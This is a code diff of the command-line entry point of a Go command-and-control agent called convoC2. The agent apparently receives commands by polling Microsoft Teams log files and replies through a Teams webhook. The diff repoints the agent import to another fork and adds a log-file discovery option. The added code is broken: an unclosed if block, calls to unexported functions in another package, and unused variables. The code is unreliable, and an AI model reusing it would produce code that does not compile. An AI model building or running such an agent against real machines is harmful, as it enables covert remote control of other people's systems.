@@ -6,7 +6,8 @@ import (
 	"os"
 	"regexp"
 
-	"github.com/cxnturi0n/convoC2/pkg/agent"
+	// import the agent package
+	"github.com/p3r531d0n/convoC2/pkg/agent"
 )
 
 var (
@@ -38,10 +39,16 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  -s, --server    C2 server URL (i.e. http://10.11.12.13/)\n")
 		fmt.Fprintf(os.Stderr, "  -t, --timeout   Teams log file polling timeout [s] (default 1)\n")
 		fmt.Fprintf(os.Stderr, "  -w, --webhook   Teams Webhook POST URL\n")
-		fmt.Fprintf(os.Stderr, `  -r, --regex     Regex to match command (default "<span[^>]*aria-label=\"([^\"]*)\"[^>]*></span>")`)
+		fmt.Fprintf(os.Stderr, `  -r, --regex     Regex to match command (default "<span[^>]*aria-label=\"([^\"]*)\"[^>]*></span>")\n`)
+		fmt.Fprintf(os.Stderr, "  -f, --find-logfiles     Returns the log files path \n")
 	}
 
 	flag.Parse()
+
+	// if -f, --find-logfiles is set, find and print the log files path
+	if flag.NArg() > 0 && flag.Arg(0) == "find-logfiles" {
+		logDir, err := agent.findLogDir()
+		logFiles, err := agent.findLogFiles(logDir)
 
 	err := agent.Start(verbose, serverURL, timeout, webhookURL, regexp.MustCompile(commandRegex))
 	if err != nil {
